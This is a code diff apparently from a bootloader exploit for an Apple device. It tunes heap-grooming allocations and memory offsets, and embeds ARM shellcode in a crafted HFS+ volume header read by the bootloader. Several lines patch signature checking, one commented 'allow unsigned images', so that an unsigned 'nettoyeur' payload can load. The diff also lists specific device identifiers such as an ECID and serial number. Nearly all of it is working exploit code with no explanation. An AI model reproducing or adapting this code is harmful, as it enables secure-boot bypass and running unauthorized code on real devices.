@@ -209,7 +209,7 @@ my_adjust_stack(void)
     ::
     ::    BUILD_STYLE: 5ff54894 //sp arm register
     ::
-    ::    USB_SERIAL_NUMBER: CPID:8930 CPRV:20 CPFM:03 SCEP:02 BDID:04 ECID:00000300A89CDD6E IBFL:1B SRNM:[DX4KRY0WDP0N]
+    ::    USB_SERIAL_NUMBER: CPID:8930 CPRV:20 CPFM:03 SCEP:02 BDID:04 ECID:000002641F03C3CF IBFL:1B SRNM:[DX4K3LZRDP0N]
     ::
     =======================================
      
@@ -220,13 +220,13 @@ my_adjust_stack(void)
      
      */
 #if 1
-    CALL(malloc)(0x7C0 - 64);
+    CALL(malloc)(2048 - 128);
 #elif 0
     void *ptr;
-    ptr = CALL(malloc)(2048 - 64);
+    ptr = CALL(malloc)(1984 - 64);
     CALL(free)(ptr);
-    CALL(malloc)(1024 - 32);
-    CALL(malloc)(1024 - 32);
+    CALL(malloc)(988 - 64);
+    CALL(malloc)(988 - 64);
 #endif
 }
 
@@ -246,6 +246,7 @@ suck_sid(void)
     fprintf(stderr, "suck sid\n");
 #if 0*999
     /* XXX missing 44368 (bootstrap_task::irq_disable_count=2 vs 1), 44380 (bootstrap_task::registers.R9=5FF489C0 vs 0) */
+    *(uint32_t*)XLAT(0x5ff4116c) = 0x00000000;
     *(uint32_t*)XLAT(0x5ff41170) = 0x00000000;
     *(uint32_t*)XLAT(0x5ff41174) = 0x00000000;
     *(uint32_t*)XLAT(0x5ff41178) = 0x00000000;
@@ -285,7 +286,7 @@ suck_sid(void)
     *(uint32_t*)XLAT(0x5ff41370) = 0x00000000;
     *(uint32_t*)XLAT(0x5ff41374) = 0x00000000;
     *(uint32_t*)XLAT(0x5ff41378) = 0x00000000;
-    *(uint32_t*)XLAT(0x5ff41388) = 0x00000000;
+    //*(uint32_t*)XLAT(0x5ff41388) = 0x00000000;
     *(uint32_t*)XLAT(0x5ff4138c) = 0x00000000;
     *(uint32_t*)XLAT(0x5ff41390) = 0x00000000;
     *(uint32_t*)XLAT(0x5ff414bc) = 0x00000000;
@@ -293,6 +294,7 @@ suck_sid(void)
     *(uint32_t*)XLAT(0x5ff414f4) = 0xffffffff;
     *(uint32_t*)XLAT(0x5ff41574) = XLAT(0x5ff41574);
     *(uint32_t*)XLAT(0x5ff41578) = XLAT(0x5ff41574);
+    *(uint32_t*)XLAT(0x5ff415e0) = 0xffffffff;
 #endif
     dumpfile("DUMP2");
 }
@@ -301,9 +303,9 @@ suck_sid(void)
 int
 my_readp(void *ih, void *buffer, long long offset, int length)
 {
-#define TREEDEPTH 1 /* +4? for recursion */
-#define TRYFIRST 0 /* working, but not gud */
-#define TRYLAST 0 /* not working */
+#define TREEDEPTH 1 
+#define TRYFIRST 0 
+#define TRYLAST 0 
     long long off;
     eprintf("%s(%p, %p, 0x%llx, %d)\n", __FUNCTION__, ih, buffer, offset, length);
 #if TRYLAST
@@ -315,13 +317,12 @@ my_readp(void *ih, void *buffer, long long offset, int length)
     assert(off == offset);
     length = read(rfd, buffer, length);  
 #if TREEDEPTH || TRYFIRST || TRYLAST
-#define NODE_SIZE (0x2000) /* also 0x1000 is working */
+#define NODE_SIZE (0x1000) /* also 0x1000 is working */
 #define TOTAL_NODES (0xFFF)
 #define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
 #define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)
 if (1) {
-    /* XXX stack recursion eats 208 bytes, watch out for 0x4D2C0 + 0x18 = 0x4D2D8 */
-    /* XXX stack recursione eats ??? bytes watch out for 0x41350 + 0x18 = 0x41368 */
+    /* XXX stack recursion eats 208 bytes, watch out for 0x52ac0 + 0x18 = 0x52ad8 */
     /* that address contains the irq_disable_count of the boootstrap task */
     /* probably to watch out as it is between the garbage writing */
     static int seq = 0;
@@ -331,6 +332,7 @@ if (1) {
             PUT_QWORD_BE(buffer, 0x110, 512ULL * 0x7FFFFFULL);    /* HFSPlusVolumeHeader::catalogFile.logicalSize */
             PUT_QWORD_BE(buffer,  0xC0, EXTENT_SIZE);        /* HFSPlusVolumeHeader::extentsFile.logicalSize */
             //SHELLCODE2
+#if 1    
             PUT_WORD_LE(buffer, 0x443E0 + 0 - 0x44270, INSNT_LDR_R_PC(0, 32));
             PUT_DWORD_LE(buffer, 0x443E0 + 2 - 0x44270, INSNW_MOV_R1_40000000);
             PUT_WORD_LE(buffer, 0x443E0 + 6 - 0x44270, INSNT_STR_R1_R4_R0);
@@ -338,7 +340,7 @@ if (1) {
             PUT_WORD_LE(buffer, 0x443E0 + 10 - 0x44270, INSNT_LDR_R_PC(1, 32));
             PUT_WORD_LE(buffer, 0x443E0 + 12 - 0x44270, INSNT_STR_R1_R4_R0);
             PUT_WORD_LE(buffer, 0x443E0 + 14 - 0x44270, INSNT_LDR_R_PC(0, 32));
-            PUT_WORD_LE(buffer, 0x443E0 + 16 - 0x44270, INSNT_MOV_R_I(1, 0xF8));
+            PUT_WORD_LE(buffer, 0x443E0 + 16 - 0x44270, INSNT_MOV_R_I(1, 0xFC));
             PUT_WORD_LE(buffer, 0x443E0 + 18 - 0x44270, INSNT_LDR_R_PC(2, 32));
             PUT_WORD_LE(buffer, 0x443E0 + 20 - 0x44270, INSNT_MOV_R_I(3, nettoyeur_sz));
             PUT_WORD_LE(buffer, 0x443E0 + 22 - 0x44270, INSNT_PUSH_R0);
@@ -349,6 +351,7 @@ if (1) {
             PUT_DWORD_LE(buffer, 0x443E0 + 44 - 0x44270, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
             PUT_DWORD_LE(buffer, 0x443E0 + 48 - 0x44270, (uintptr_t)image + 0x45000 /* nettoyeur uncompressed */);
             PUT_DWORD_LE(buffer, 0x443E0 + 52 - 0x44270, (uintptr_t)image + 0x445BC /* nettoyeur compressed */);
+#endif
             break;
         case 1:
             memset(buffer, 'E', length);
@@ -579,7 +582,7 @@ if (1) {
 void
 check_irq_count(void)
 {
-    eprintf("irq_disable_count = 0x%x\n", *(unsigned int *)(image + 0x41350 + 0x18));
+    eprintf("irq_disable_count = 0x%x\n", *(unsigned int *)(image + 0x52ac0 + 0x18));
 }
 
 
